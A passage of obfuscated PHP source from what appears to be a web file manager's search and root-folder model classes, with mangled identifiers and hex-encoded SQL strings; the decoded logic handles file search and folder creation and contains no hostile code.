= "{$Í¦³°×Ò}\151\x6f\137\146\x69\154\x65\x20\x66\151\154\x65\x73\x20\x6f\x6e\40\x66\151\154\x65\x73\56\146\151\154\145\111\x44\x20\x3d\x20\x68\151\163\164\157\162\171\56\x66\x69\x6c\145\111\104"; return $this->alias($÷¦¼˜º[2235])->where($ÌˆĞ¦•ã)->join($Ä˜Ù·ì, $÷¦¼˜º[2236])->sum($÷¦¼˜º[79]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($†¨½—†) { $Áî°»µ =& $_SERVER[¿ğÚ‰±–]; $“Ã±¶¯¾ = KodIO::fileTypeList(); $ê Á“ºá = $“Ã±¶¯¾[$†¨½—†]; if (!$ê Á“ºá) { return array(); } $°›—ëçü = $ê Á“ºá[$Áî°»µ[169]]; $Åø×ËàÜ = $Áî°»µ[7]; if (!$ê Á“ºá[$Áî°»µ[169]]) { $²¢îã¨ = array_to_keyvalue($“Ã±¶¯¾, $Áî°»µ[12], $Áî°»µ[169]); $°›—ëçü = implode($Áî°»µ[50], $²¢îã¨); $Åø×ËàÜ = $Áî°»µ[2238]; } $·àù¼±Å = explode($Áî°»µ[50], trim($°›—ëçü, $Áî°»µ[50])); return array($Åø×ËàÜ, $·àù¼±Å); } public function listPathType($²–Æèœ) { $çÓñÊ¸• =& $_SERVER[¿ğÚ‰±–]; $¢¥ôÀÁ‘ = $this->fileTypeWhere($²–Æèœ); if (!$¢¥ôÀÁ‘) { return array(); } $ƒ»¶äüì = USER_ID; $İõ×ƒº¼ = Model($çÓñÊ¸•[598])->getInfo($ƒ»¶äüì); $¼½”ºò— = array($çÓñÊ¸•[648] => SourceModel::TYPE_USER, $çÓñÊ¸•[584] => array($çÓñÊ¸•[612], $çÓñÊ¸•[594] . $İõ×ƒº¼[$çÓñÊ¸•[90]][$çÓñÊ¸•[193]] . $çÓñÊ¸•[613]), $çÓñÊ¸•[649] => $ƒ»¶äüì, $çÓñÊ¸•[646] => 0, $çÓñÊ¸•[647] => $¢¥ôÀÁ‘); return $this->listSource($¼½”ºò—); } public function listSearch($›ßú’, $í”ÉşÁä = 300) { $ÄÓ¥¾»© =& $_SERVER[¿ğÚ‰±–]; if (isset($›ßú’[$ÄÓ¥¾»©[2074]]) && $›ßú’[$ÄÓ¥¾»©[2074]]) { $›ßú’[$ÄÓ¥¾»©[2074]] = str_replace($ÄÓ¥¾»©[460], $ÄÓ¥¾»©[2239], trim($›ßú’[$ÄÓ¥¾»©[2074]])); } $Ş…±Ÿ› = $this->_parseSearchWhere($›ßú’); if (!isset($Ş…±Ÿ›[$ÄÓ¥¾»©[505]])) { $Ş…±Ÿ›[$ÄÓ¥¾»©[505]] = 0; } $Ì´Şï¿ = $ÄÓ¥¾»©[2240]; $€ëØÙàö = $Ş…±Ÿ›; $×ÈÄ—Ò« = $Ì´Şï¿; $this->_listSearchBindPinyin($›ßú’, $Ş…±Ÿ›, $Ì´Şï¿); $this->alias($ÄÓ¥¾»©[519])->_makeOrder(); $Ş…±Ÿ› = $this->parseWhereLike($Ş…±Ÿ›); $¤ààéØ = $this->distinct(!0)->field($Ì´Şï¿)->where($Ş…±Ÿ›)->selectPage($í”ÉşÁä); if ($GLOBALS[$ÄÓ¥¾»©[6]][$ÄÓ¥¾»©[457]][$ÄÓ¥¾»©[458]] && Input::check($›ßú’[$ÄÓ¥¾»©[2074]], $ÄÓ¥¾»©[655]) && $¤ààéØ[$ÄÓ¥¾»©[442]][$ÄÓ¥¾»©[429]] == 1 && $¤ààéØ[$ÄÓ¥¾»©[442]][$ÄÓ¥¾»©[443]] == 0) { $¤ààéØ = $this->distinct(!0)->field($Ì´Şï¿)->where($€ëØÙàö)->limit(1000)->select(); $¤ààéØ = array_page_split($¤ààéØ, !1, $í”ÉşÁä); } $this->_listSearchFileContent($¤ààéØ, $›ßú’, $×ÈÄ—Ò«, $€ëØÙàö); $this->_listSearchDesc($¤ààéØ, $›ßú’, $×ÈÄ—Ò«); $this->_listSearchTag($¤ààéØ, $›ßú’, $×ÈÄ—Ò«); $this->_listSearchGroupTag($¤ààéØ, $›ßú’, $×ÈÄ—Ò«); $this->_listDataApply($¤ààéØ[$ÄÓ¥¾»©[445]]); $this->_listMake($¤ààéØ); return $¤ààéØ; } private function _listSearchFileContent(&$ë˜İÁÄ, $Å­£È¥€, $­‚´×Ï€, $Ö©ÔŒ¡É) { $º³¤˜¯î =& $_SERVER[¿ğÚ‰±–]; if (!$Å­£È¥€[$º³¤˜¯î[2074]] || $ë˜İÁÄ[$º³¤˜¯î[442]][$º³¤˜¯î[429]] > 1) { return; } if (!isset($Ö©ÔŒ¡É[$º³¤˜¯î[32]]) || !is_array($Å­£È¥€[$º³¤˜¯î[541]])) { return; } $Ö©ÔŒ¡É[$º³¤˜¯î[541]] = array($º³¤˜¯î[7], $Å­£È¥€[$º³¤˜¯î[541]]); unset($Ö©ÔŒ¡É[$º³¤˜¯î[32]]); unset($Å­£È¥€[$º³¤˜¯î[541]]); $ş®©Îş• = $this->field($­‚´×Ï€)->where($Ö©ÔŒ¡É)->limit($º³¤˜¯î[2241])->select(); if (!$ş®©Îş• || count($ş®©Îş•) == 0) { return; } $ë˜İÁÄ[$º³¤˜¯î[445]] = array_merge($ş®©Îş•, $ë˜İÁÄ[$º³¤˜¯î[445]]); $ë˜İÁÄ[$º³¤˜¯î[442]][$º³¤˜¯î[443]] += count($ş®©Îş•); } private function _listSearchTag(&$Æ‘ŒÁÛó, $ì“úİ¿ç, $±”— é§) { $ÎèŸØ¡§ =& $_SERVER[¿ğÚ‰±–]; if (!$ì“úİ¿ç[$ÎèŸØ¡§[2074]] || $Æ‘ŒÁÛó[$ÎèŸØ¡§[442]][$ÎèŸØ¡§[429]] > 1) { return; } $£ø÷«ğû = Model($ÎèŸØ¡§[2242])->listData(); $®î›‘ú‹ = array(); $ÈôÆˆÚ  = $ì“úİ¿ç[$ÎèŸØ¡§[2074]]; foreach ($£ø÷«ğû as $ûøÏç¿ç) { $¦îæ§× = $ûøÏç¿ç[$ÎèŸØ¡§[32]]; $†È˜Á = str_replace($ÎèŸØ¡§[53], $ÎèŸØ¡§[12], Pinyin::get($¦îæ§×)); if (stripos($¦îæ§×, $ÈôÆˆÚ ) !== !1 || stripos($†È˜Á, $ÈôÆˆÚ ) !== !1) { $®î›‘ú‹[] = $ûøÏç¿ç[$ÎèŸØ¡§[475]]; } } if (!$®î›‘ú‹) { return; } $øØ§„Î = array($ÎèŸØ¡§[500] => array($ÎèŸØ¡§[7], $®î›‘ú‹), $ÎèŸØ¡§[1777] => USER_ID); $Á¡¸É–´ = Model($ÎèŸØ¡§[502])->field($ÎèŸØ¡§[87])->where($øØ§„Î)->select(); $Á¡¸É–´ = array_to_keyvalue($Á¡¸É–´, $ÎèŸØ¡§[12], $ÎèŸØ¡§[87]); $äåÆœŞö = array_unique($Á¡¸É–´); $this->_listSearchMerge($Æ‘ŒÁÛó, $ì“úİ¿ç, $±”— é§, $äåÆœŞö); } private function _listSearchDesc(&$áûù«çº, $æÌıÙË, $Êñ¬Œ‹ş) { $°ÒêÔé² =& $_SERVER[¿ğÚ‰±–]; if (!$æÌıÙË[$°ÒêÔé²[2074]] || $áûù«çº[$°ÒêÔé²[442]][$°ÒêÔé²[429]] > 1) { return; } $Ö¬÷ÌıË = array($°ÒêÔé²[97] => $°ÒêÔé²[526], $°ÒêÔé²[450] => array($°ÒêÔé²[459], $°ÒêÔé²[2076] . $æÌıÙË[$°ÒêÔé²[2074]] . $°ÒêÔé²[2076])); $ğ×Ê§Š = !1; if ($ğ×Ê§Š) { $Ûı¸«§² = $this->listSearchChildren($æÌıÙË[$°ÒêÔé²[192]]); $Ûı¸«§² = array_unique($Ûı¸«§²); if (!$Ûı¸«§²) { return; } $Ö¬÷ÌıË[$°ÒêÔé²[193]] = array($°ÒêÔé²[7], $Ûı¸«§²); } $×öË›Ğ = Model($°ÒêÔé²[632])->field($°ÒêÔé²[193])->where($Ö¬÷ÌıË)->limit(5000)->select(); $§®·Šì· = array_to_keyvalue($×öË›Ğ, $°ÒêÔé²[12], $°ÒêÔé²[193]); $this->_listSearchMerge($áûù«çº, $æÌıÙË, $Êñ¬Œ‹ş, $§®·Šì·); } private function _listSearchGroupTag(&$—“ÎŸ°¬, $Àİ¢éñ®, $ÕŠ”Û±î) { $ö÷¢Ë• =& $_SERVER[¿ğÚ‰±–]; if (!$Àİ¢éñ®[$ö÷¢Ë•[2074]] || $—“ÎŸ°¬[$ö÷¢Ë•[442]][$ö÷¢Ë•[429]] > 1 || !$Àİ¢éñ®[$ö÷¢Ë•[192]]) { return; } $°ÍÏÖ¯£ = $this->sourceInfo($Àİ¢éñ®[$ö÷¢Ë•[192]]); if (!$°ÍÏÖ¯£ || $°ÍÏÖ¯£[$ö÷¢Ë•[190]] != SourceModel::TYPE_GROUP) { return; } $¬×¸”Ş = $°ÍÏÖ¯£[$ö÷¢Ë•[569]]; $Ø‘µæù = Model($ö÷¢Ë•[2243])->get($¬×¸”Ş); $‚•âŸµ = array(); $øíÆˆøé = $Àİ¢éñ®[$ö÷¢Ë•[2074]]; foreach ($Ø‘µæù[$ö÷¢Ë•[445]] as $®­§ä¨) { $Ñ¨ùœé = $®­§ä¨[$ö÷¢Ë•[32]]; $²’”ÈÎ³ = str_replace($ö÷¢Ë•[53], $ö÷¢Ë•[12], Pinyin::get($Ñ¨ùœé)); if (stripos($Ñ¨ùœé, $øíÆˆøé) !== !1 || stripos($²’”ÈÎ³, $øíÆˆøé) !== !1) { $‚•âŸµ[] = $®­§ä¨[$ö÷¢Ë•[475]]; } } if (!$‚•âŸµ) { return; } $Ëö¼¢× = array($ö÷¢Ë•[500] => array($ö÷¢Ë•[7], $‚•âŸµ), $ö÷¢Ë•[1777] => 0, $ö÷¢Ë•[33] => $ö÷¢Ë•[2096] . $¬×¸”Ş); $çùö³àÀ = Model($ö÷¢Ë•[502])->field($ö÷¢Ë•[87])->where($Ëö¼¢×)->select(); $çùö³àÀ = array_to_keyvalue($çùö³àÀ, $ö÷¢Ë•[12], $ö÷¢Ë•[87]); $ˆší¦ş» = array_unique($çùö³àÀ); $this->_listSearchMerge($—“ÎŸ°¬, $Àİ¢éñ®, $ÕŠ”Û±î, $ˆší¦ş»); } private function _listSearchMerge(&$›œ¸€şÒ, $¦àš´ç, $¢È¹ÜÙ, $†æáÀ®Á) { $ş—­´Îö =& $_SERVER[¿ğÚ‰±–]; if (!$†æáÀ®Á) { return; } $ÍĞŸ›š = array_to_keyvalue($›œ¸€şÒ[$ş—­´Îö[445]], $ş—­´Îö[12], $ş—­´Îö[193]); $¿Ã¬‰¤† = array_diff($†æáÀ®Á, $ÍĞŸ›š); if (!$¿Ã¬‰¤†) { return; } $„ğ½§Î³ = array($ş—­´Îö[193] => array($ş—­´Îö[7], $¿Ã¬‰¤†)); $ß‘‹ªûˆ = $this->field($¢È¹ÜÙ)->where($„ğ½§Î³)->select(); if (!$ß‘‹ªûˆ) { return; } $™‚â¢ÁÎ = array(); foreach ($ß‘‹ªûˆ as $¸âÏ‹Ïá) { if ($this->_listSearchFilter($¸âÏ‹Ïá, $¦àš´ç)) { $™‚â¢ÁÎ[] = $¸âÏ‹Ïá; } } $›œ¸€şÒ[$ş—­´Îö[445]] = array_merge($™‚â¢ÁÎ, $›œ¸€şÒ[$ş—­´Îö[445]]); $›œ¸€şÒ[$ş—­´Îö[442]][$ş—­´Îö[443]] += count($™‚â¢ÁÎ); } private function _listSearchFilter($€’Ìºš, $êœ™€İÁ) { $«ó‚à‰Ñ =& $_SERVER[¿ğÚ‰±–]; $ª‘›¸­İ = $€’Ìºš[$«ó‚à‰Ñ[485]] == $«ó‚à‰Ñ[91]; if (!strstr($€’Ìºš[$«ó‚à‰Ñ[584]], $«ó‚à‰Ñ[50] . $êœ™€İÁ[$«ó‚à‰Ñ[192]] . $«ó‚à‰Ñ[50])) { return !1; } if (isset($êœ™€İÁ[$«ó‚à‰Ñ[486]]) && $êœ™€İÁ[$«ó‚à‰Ñ[486]] != $«ó‚à‰Ñ[854]) { if ($êœ™€İÁ[$«ó‚à‰Ñ[486]] == $«ó‚à‰Ñ[78] && !$ª‘›¸­İ) { return !1; } if ($êœ™€İÁ[$«ó‚à‰Ñ[486]] != $«ó‚à‰Ñ[78] && $ª‘›¸­İ) { return !1; } if (!strstr($€’Ìºš[$«ó‚à‰Ñ[169]], $«ó‚à‰Ñ[50] . $êœ™€İÁ[$«ó‚à‰Ñ[486]] . $«ó‚à‰Ñ[50])) { return !1; } } if (isset($êœ™€İÁ[$«ó‚à‰Ñ[2244]]) && $êœ™€İÁ[$«ó‚à‰Ñ[2244]] < $€’Ìºš[$«ó‚à‰Ñ[79]]) { return !1; } if (isset($êœ™€İÁ[$«ó‚à‰Ñ[2245]]) && $êœ™€İÁ[$«ó‚à‰Ñ[2245]] > $€’Ìºš[$«ó‚à‰Ñ[79]]) { return !1; } if (isset($êœ™€İÁ[$«ó‚à‰Ñ[662]]) && $êœ™€İÁ[$«ó‚à‰Ñ[662]] != $€’Ìºš[$«ó‚à‰Ñ[529]]) { return !1; } return !0; } public function listSearchChildren($Ë¢­†‘Å, $¥˜–âã„ = 5000) { $áôÁØîü =& $_SERVER[¿ğÚ‰±–]; $®û¢€³ß = array(); $ö¡œ¶ØÛ = $this->sourceInfo($Ë¢­†‘Å); $¸şï‘™ = array($áôÁØîü[584] => array($áôÁØîü[459], $ö¡œ¶ØÛ[$áôÁØîü[584]] . $ö¡œ¶ØÛ[$áôÁØîü[193]] . $áôÁØîü[613])); $Ä¬Şß”í = $this->field($áôÁØîü[79])->where($¸şï‘™)->limit($¥˜–âã„ + 1)->select(); $×é¬®×î = is_array($Ä¬Şß”í) ? count($Ä¬Şß”í) : 0; if ($×é¬®×î > $¥˜–âã„) { return $this->_listSearchChildrenNear($Ë¢­†‘Å, $¥˜–âã„); } $ı‘ûÈÉ = $this->field($áôÁØîü[193])->where($¸şï‘™)->select(); $®û¢€³ß = array_to_keyvalue($ı‘ûÈÉ, $áôÁØîü[12], $áôÁØîü[193]); return $®û¢€³ß; } private function _listSearchChildrenNear($Ù€ïŠ·Á, $¦üÍ¢Æ) { $Íİâñßå =& $_SERVER[¿ğÚ‰±–]; $Úƒğúí¿ = array(); $µƒòôİÏ = array($Íİâñßå[192] => $Ù€ïŠ·Á); $‹¢Óšºè = $this->field($Íİâñßå[2246])->where($µƒòôİÏ)->select(); $˜ñâı×ô = array_to_keyvalue(array_filter_by_field($‹¢Óšºè, $Íİâñßå[485], $Íİâñßå[91]), $Íİâñßå[12], $Íİâñßå[193]); $Úƒğúí¿ = array_merge($Úƒğúí¿, array_to_keyvalue($‹¢Óšºè, $Íİâñßå[12], $Íİâñßå[193])); if (!$˜ñâı×ô) { return $Úƒğúí¿; } $µƒòôİÏ = array($Íİâñßå[192] => array($Íİâñßå[7], $˜ñâı×ô)); $‹¢Óšºè = $this->field($Íİâñßå[2246])->where($µƒòôİÏ)->limit($¦üÍ¢Æ)->select(); $Úƒğúí¿ = array_merge($Úƒğúí¿, array_to_keyvalue($‹¢Óšºè, $Íİâñßå[12], $Íİâñßå[193])); $Úƒğúí¿ = array_slice($Úƒğúí¿, 0, intval($¦üÍ¢Æ)); return $Úƒğúí¿; } private function _listSearchBindPinyin($Ş¹†¯™Ø, &$¨ã‘¿ù¶, &$Üáê¹õ) { $ËÀÊ®µ÷ =& $_SERVER[¿ğÚ‰±–]; if (!isset($Ş¹†¯™Ø[$ËÀÊ®µ÷[2074]]) || !$Ş¹†¯™Ø[$ËÀÊ®µ÷[2074]]) { return; } if (!Input::check($Ş¹†¯™Ø[$ËÀÊ®µ÷[2074]], $ËÀÊ®µ÷[394]) || strlen($Ş¹†¯™Ø[$ËÀÊ®µ÷[2074]]) < 2) { return; } $øâç²Ğ‹ = "\114\105\x46\x54\40\112\x4f\111\x4e\x20{$this->tablePrefix}\x69\157\x5f\163\157\x75\162\143\x65\137\155\x65\164\x61\40\155\145\x74\x61\x20\157\x6e\40\x73\157\165\162\143\145\56\163\157\165\x72\x63\x65\111\104\x20\x3d\x20\155\x65\164\141\56\163\157\165\x72\x63\x65\111\x44"; $¤šôéš³ = array(); $Üáê¹õ = str_replace(array($ËÀÊ®µ÷[262], $ËÀÊ®µ÷[53], $ËÀÊ®µ÷[2247]), $ËÀÊ®µ÷[12], $Üáê¹õ); $Üáê¹õ = $ËÀÊ®µ÷[511] . str_replace($ËÀÊ®µ÷[50], $ËÀÊ®µ÷[512], $Üáê¹õ); $ñàîŒõé = $¨ã‘¿ù¶[$ËÀÊ®µ÷[32]]; unset($¨ã‘¿ù¶[$ËÀÊ®µ÷[32]]); foreach ($¨ã‘¿ù¶ as $ğë¦Ùªê => $¬é¦ã­ï) { $¤šôéš³[$ËÀÊ®µ÷[511] . $ğë¦Ùªê] = $¬é¦ã­ï; } foreach ($ñàîŒõé as $ç§¨ø§ñ) { $¤šôéš³[] = array($ËÀÊ®µ÷[516] => $ç§¨ø§ñ, $ËÀÊ®µ÷[1085] => $ËÀÊ®µ÷[2078], array($ËÀÊ®µ÷[2248] => $ç§¨ø§ñ, $ËÀÊ®µ÷[2249] => array($ËÀÊ®µ÷[7], array($ËÀÊ®µ÷[538], $ËÀÊ®µ÷[537])))); } $this->join($øâç²Ğ‹); $¨ã‘¿ù¶ = $¤šôéš³; } private function _parseSearchWhere($ç‡­Á†) { $•¨†şÃï =& $_SERVER[¿ğÚ‰±–]; $˜´™’—Í = array(); if (isset($ç‡­Á†[$•¨†şÃï[838]]) && $ç‡­Á†[$•¨†şÃï[838]]) { $˜´™’—Í[$•¨†şÃï[88]] = array($•¨†şÃï[2250], $ç‡­Á†[$•¨†şÃï[838]]); } if (isset($ç‡­Á†[$•¨†şÃï[839]]) && $ç‡­Á†[$•¨†şÃï[839]]) { $ïŸç÷Š¿ = array($•¨†şÃï[2251], $ç‡­Á†[$•¨†şÃï[839]]); if ($˜´™’—Í[$•¨†şÃï[88]]) { $˜´™’—Í[$•¨†şÃï[88]] = array($˜´™’—Í[$•¨†şÃï[88]], $ïŸç÷Š¿, $•¨†şÃï[2252]); } else { $˜´™’—Í[$•¨†şÃï[88]] = $ïŸç÷Š¿; } } if (isset($ç‡­Á†[$•¨†şÃï[2244]]) && $ç‡­Á†[$•¨†şÃï[2244]] > 0) { $˜´™’—Í[$•¨†şÃï[79]] = array($•¨†şÃï[2250], $ç‡­Á†[$•¨†şÃï[2244]]); } if (isset($ç‡­Á†[$•¨†şÃï[2245]]) && $ç‡­Á†[$•¨†şÃï[2245]]) { $ïŸç÷Š¿ = array($•¨†şÃï[2251], $ç‡­Á†[$•¨†şÃï[2245]]); if ($˜´™’—Í[$•¨†şÃï[79]]) { $˜´™’—Í[$•¨†şÃï[79]] = array($˜´™’—Í[$•¨†şÃï[79]], $ïŸç÷Š¿, $•¨†şÃï[2252]); } else { $˜´™’—Í[$•¨†şÃï[79]] = $ïŸç÷Š¿; } } if (isset($ç‡­Á†[$•¨†şÃï[662]]) && $ç‡­Á†[$•¨†şÃï[662]]) { $˜´™’—Í[] = array($•¨†şÃï[529] => $ç‡­Á†[$•¨†şÃï[662]], $•¨†şÃï[527] => $ç‡­Á†[$•¨†şÃï[662]], $•¨†şÃï[1085] => $•¨†şÃï[2078]); } if (isset($ç‡­Á†[$•¨†şÃï[486]]) && $ç‡­Á†[$•¨†şÃï[486]]) { $îÂˆµµĞ = $ç‡­Á†[$•¨†şÃï[486]]; if ($îÂˆµµĞ == $•¨†şÃï[78]) { $˜´™’—Í[$•¨†şÃï[485]] = 1; } else { if ($îÂˆµµĞ == $•¨†şÃï[2253]) { $˜´™’—Í[$•¨†şÃï[485]] = 0; } else { if ($îÂˆµµĞ) { $îÂˆµµĞ = is_array($îÂˆµµĞ) ? $îÂˆµµĞ : explode($•¨†şÃï[50], $îÂˆµµĞ); $˜´™’—Í[$•¨†şÃï[486]] = array($•¨†şÃï[492], $îÂˆµµĞ); $˜´™’—Í[$•¨†şÃï[485]] = 0; } } } } $this->_parseSearchParent($ç‡­Á†, $˜´™’—Í); if (isset($ç‡­Á†[$•¨†şÃï[2074]]) && trim($ç‡­Á†[$•¨†şÃï[2074]])) { $˜€¯¸Ğ™ = trim($ç‡­Á†[$•¨†şÃï[2074]]); $Üñ·± = explode($•¨†şÃï[53], $˜€¯¸Ğ™); if (strlen($˜€¯¸Ğ™) > 2 && (substr($˜€¯¸Ğ™, 0, 1) == $•¨†şÃï[121] && substr($˜€¯¸Ğ™, -1) == $•¨†şÃï[121]) || substr($˜€¯¸Ğ™, 0, 1) == $•¨†şÃï[58] && substr($˜€¯¸Ğ™, -1) == $•¨†şÃï[58]) { $˜€¯¸Ğ™ = substr($˜€¯¸Ğ™, 1, -1); $Üñ·± = array($˜€¯¸Ğ™); } $˜´™’—Í[$•¨†şÃï[32]] = array(array($•¨†şÃï[612], $•¨†şÃï[2076] . $˜€¯¸Ğ™ . $•¨†şÃï[2076])); if (count($Üñ·±) > 1) { $˜´™’—Í[$•¨†şÃï[32]] = array(); foreach ($Üñ·± as $¢ú›âîÄ) { if (!trim($¢ú›âîÄ)) { continue; } $˜´™’—Í[$•¨†şÃï[32]][] = array($•¨†şÃï[612], $•¨†şÃï[2076] . trim($¢ú›âîÄ) . $•¨†şÃï[2076]); } } } return $˜´™’—Í; } private function _parseSearchParent($ŒÆÜ²œÀ, &$òàÀ­Àå) { $ü¾ŞºŒ€ =& $_SERVER[¿ğÚ‰±–]; if (!isset($ŒÆÜ²œÀ[$ü¾ŞºŒ€[192]]) || !$ŒÆÜ²œÀ[$ü¾ŞºŒ€[192]]) { return; } $µŸ²¬Çó = $this->pathInfo($ŒÆÜ²œÀ[$ü¾ŞºŒ€[192]]); $¡‡Ó‚ä = $µŸ²¬Çó[$ü¾ŞºŒ€[192]] . $ü¾ŞºŒ€[12] === $ü¾ŞºŒ€[228]; $•ŸÌ«§· = $µŸ²¬Çó[$ü¾ŞºŒ€[190]] == $ü¾ŞºŒ€[578]; if ($µŸ²¬Çó[$ü¾ŞºŒ€[595]] == $ü¾ŞºŒ€[596]) { $—äáù› = $this->sourceInfo($ŒÆÜ²œÀ[$ü¾ŞºŒ€[192]]); $µŸ²¬Çó[$ü¾ŞºŒ€[584]] = $—äáù›[$ü¾ŞºŒ€[584]]; } $òàÀ­Àå[$ü¾ŞºŒ€[652]] = array($ü¾ŞºŒ€[612], $µŸ²¬Çó[$ü¾ŞºŒ€[584]] . $ŒÆÜ²œÀ[$ü¾ŞºŒ€[192]] . $ü¾ŞºŒ€[613]); $¿’±Æã¡ = isset($ŒÆÜ²œÀ[$ü¾ŞºŒ€[1934]]) && in_array($ü¾ŞºŒ€[578], $ŒÆÜ²œÀ[$ü¾ŞºŒ€[1934]]); if (!$¿’±Æã¡ || !$•ŸÌ«§· || !$¡‡Ó‚ä || !$µŸ²¬Çó[$ü¾ŞºŒ€[487]]) { return; } if (!AuthModel::authCheckRoot($µŸ²¬Çó[$ü¾ŞºŒ€[487]][$ü¾ŞºŒ€[488]])) { return; } $›œÔ¶íá = $µŸ²¬Çó[$ü¾ŞºŒ€[569]] . $ü¾ŞºŒ€[12]; if ($›œÔ¶íá == $ü¾ŞºŒ€[91]) { unset($òàÀ­Àå[$ü¾ŞºŒ€[652]]); $òàÀ­Àå[$ü¾ŞºŒ€[190]] = self::TYPE_GROUP; return; } $ùä³‰†¾ = Model($ü¾ŞºŒ€[585])->groupChildrenAll($›œÔ¶íá); $ıßë¢¦ = count($ùä³‰†¾); if ($ıßë¢¦ <= 1) { return; } $ŞşºœÈÂ = array($ü¾ŞºŒ€[192] => 0, $ü¾ŞºŒ€[190] => self::TYPE_GROUP, $ü¾ŞºŒ€[569] => array($ü¾ŞºŒ€[7], $ùä³‰†¾)); $ÚçŒ³¼ = $this->field($ü¾ŞºŒ€[2254])->where($ŞşºœÈÂ)->limit($ıßë¢¦)->select(); $òàÀ­Àå[$ü¾ŞºŒ€[652]] = array(); foreach ($ÚçŒ³¼ as $ÑÜçÓøğ) { $òàÀ­Àå[$ü¾ŞºŒ€[652]][] = array($ü¾ŞºŒ€[612], $ü¾ŞºŒ€[594] . $ÑÜçÓøğ[$ü¾ŞºŒ€[193]] . $ü¾ŞºŒ€[613]); } $òàÀ­Àå[$ü¾ŞºŒ€[652]][] = $ü¾ŞºŒ€[2078]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($ŸĞÆÜŸŠ) { $£¸×–Á =& $_SERVER[¿ğÚ‰±–]; $³óĞ¯˜Ô = Model($£¸×–Á[577])->where(array($£¸×–Á[1768] => $ŸĞÆÜŸŠ))->find(); $—½ùìï˜ = $this->_mkdirRoot(SourceModel::TYPE_USER, $ŸĞÆÜŸŠ, $³óĞ¯˜Ô[$£¸×–Á[32]]); $this->userDesktopAdd($—½ùìï˜); return $—½ùìï˜; } public function userDesktopAdd($˜Ç½Äü) { $¢ÏÕÓ¦ =& $_SERVER[¿ğÚ‰±–]; $äûÍ‰Ù´ = LNG($¢ÏÕÓ¦[2255]); $›¸ÚÏ– = $this->mkdir($˜Ç½Äü, $äûÍ‰Ù´); $this->metaSet($›¸ÚÏ–, $¢ÏÕÓ¦[2256], $¢ÏÕÓ¦[91]); $this->metaSet($˜Ç½Äü, $¢ÏÕÓ¦[2257], $›¸ÚÏ–); } public function userPathSafeAdd($µ±‹î‹Ê) { $¼Ÿ«¬¬³ =& $_SERVER[¿ğÚ‰±–]; $ëäËòŒ” = Model($¼Ÿ«¬¬³[577])->getInfoFull($µ±‹î‹Ê); if (!$ëäËòŒ”) { return !1; } if (_get($ëäËòŒ”, $¼Ÿ«¬¬³[599])) { return $ëäËòŒ”[$¼Ÿ«¬¬³[539]][$¼Ÿ«¬¬³[2258]]; } $œÏ˜Ê×´ = $this->_mkdirRoot(SourceModel::TYPE_USER, $µ±‹î‹Ê, $¼Ÿ«¬¬³[2259], $¼Ÿ«¬¬³[506]); Model($¼Ÿ«¬¬³[577])->metaSet($µ±‹î‹Ê, $¼Ÿ«¬¬³[2258], $œÏ˜Ê×´); $this->metaSet($œÏ˜Ê×´, $¼Ÿ«¬¬³[2260], $µ±‹î‹Ê); return $œÏ˜Ê×´; } public function groupRootAdd($Û—Çğú¸) { $÷ğÀÏ‘” =& $_SERVER[¿ğÚ‰±–]; $Œ±­¾¤¯ = Model($÷ğÀÏ‘”[585])->where(array($÷ğÀÏ‘”[2068] => $Û—Çğú¸))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $Û—Çğú¸, $Œ±­¾¤¯[$÷ğÀÏ‘”[32]]); } public function systemRootPathAdd($®÷şøœé) { if ($®÷şøœé != $_SERVER[¿ğÚ‰±–][605]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $®÷şøœé); } public function userRootRemove($äªÀ¢÷ğ) { $ĞÇ‹”¾ = $this->targetSourceRoot(SourceModel::TYPE_USER, $äªÀ¢÷ğ, !0); foreach ($ĞÇ‹”¾ as $¢×é³ˆ«) { if (!$¢×é³ˆ«) { continue; } $this->remove($¢×é³ˆ«[$_SERVER[¿ğÚ‰±–][193]], !1); } } public function groupRootRemove($°¼Ü„) { $çª§éÅğ = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $°¼Ü„); if (!$çª§éÅğ) { return; } $this->remove($çª§éÅğ[$_SERVER[¿ğÚ‰±–][193]], !1); } private function _mkdirRoot($‡—ÒÈ”î, $ÖòĞô, $Èµã¡ßˆ, $··šË‡ò = '') { $î† ¶äÇ =& $_SERVER[¿ğÚ‰±–]; $Â¾äÑàà = defined($î† ¶äÇ[2202]) ? USER_ID : 0; $®¨´ğŸ = array($î† ¶äÇ[477] => 0, $î† ¶äÇ[648] => $‡—ÒÈ”î, $î† ¶äÇ[649] => $ÖòĞô, $î† ¶äÇ[646] => 1, $î† ¶äÇ[650] => $Â¾äÑàà, $î† ¶äÇ[651] => $Â¾äÑàà, $î† ¶äÇ[647] => $··šË‡ò, $î† ¶äÇ[652] => $î† ¶äÇ[594], $î† ¶äÇ[504] => 0, $î† ¶äÇ[617] => 0, $î† ¶äÇ[542] => 0, $î† ¶äÇ[653] => $î† ¶äÇ[12]); if ($Èé©ˆ¯  = $this->where($®¨´ğŸ)->find()) { return $Èé©ˆ¯ [$î† ¶äÇ[193]]; } $°¸×ôû€ = "\115\157\x64\x65\154\123\x6f\165\162\143\x65\x2e\x6d\153\144\151\x72\122\157\x6f\164\x2e{$‡—ÒÈ”î}\x2e{$ÖòĞô}\56" . $Èµã¡ßˆ; CacheLock::lock($°¸×ôû€); $®¨´ğŸ[$î† ¶äÇ[32]] = $Èµã¡ßˆ; $¡¸Éñæ’ = $this->add($®¨´ğŸ); $¶’½øÀ” = array($î† ¶äÇ[654] => short_id($¡¸Éñæ’)); $this->where(array($î† ¶äÇ[491] => $¡¸Éñæ’))->save($¶’½øÀ”); CacheLock::unlock($°¸×ôû€); return $¡¸Éñæ’; } private function targetSourceRoot($°ğ“ŞøÍ, $Ê´Áş, $¶ó¸íÕ© = false) { $¸òîÅÆ“ =& $_SERVER[¿ğÚ‰±–]; $µ­±´´ = array($¸òîÅÆ“[477] => 0, $¸òîÅÆ“[648] => $°ğ“ŞøÍ, $¸òîÅÆ“[649] => $Ê´Áş); if ($¶ó¸íÕ©) { $€Ã‰ğœ§ = $this->where($µ­±´´)->select(); return $€Ã‰ğœ§ ? $€Ã‰ğœ§ : array(); } $‹ïÊôÓü = $this->where($µ­±´´)->find(); return $‹ïÊôÓü ? $‹ïÊôÓü : array(); } public function sourceRootGroup($¿õËÀÑÎ) { $Ñ»“õ‚Å =& $_SERVER[¿ğÚ‰±–]; if 